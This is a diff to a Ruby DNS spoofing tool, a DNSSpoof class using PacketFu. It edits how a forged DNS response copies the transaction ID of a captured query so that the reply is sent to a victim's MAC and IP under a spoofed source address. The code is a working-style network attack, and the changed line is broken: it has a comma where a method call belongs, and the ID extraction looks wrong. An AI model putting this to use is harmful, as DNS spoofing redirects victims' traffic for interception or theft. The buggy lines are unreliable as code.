@@ -149,7 +149,9 @@ class DNSSpoof < Spoof
     #---------------------------------------------------------------------------
     def send_response
         cfg = PacketFu::Utils.whoami?(:iface => @interface)
-        
+        transID1 = @packet[0].unpack('H*')[0]
+        transID2 = @packet[1].unpack('H*')[0]
+
         # Create response packet
         udp_packet = PacketFu::UDPPacket.new(:config => cfg, 
                                 :udp_src => @packet.udp_dst, 
@@ -157,7 +159,7 @@ class DNSSpoof < Spoof
         udp_packet.eth_daddr = @victim_mac
         udp_packet.ip_daddr = @victim_ip
         udp_packet.ip_saddr = @packet.ip_saddr
-        udp_packet.payload = @packet.payload[0, 2]
+        udp_packet.payload = transID1,hex.chr + transID2.hex.chr
         
         udp_packet.payload += "\x81" + "\x80" + "\x00" + "\x01" + "\x00" + "\x01"
         udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"
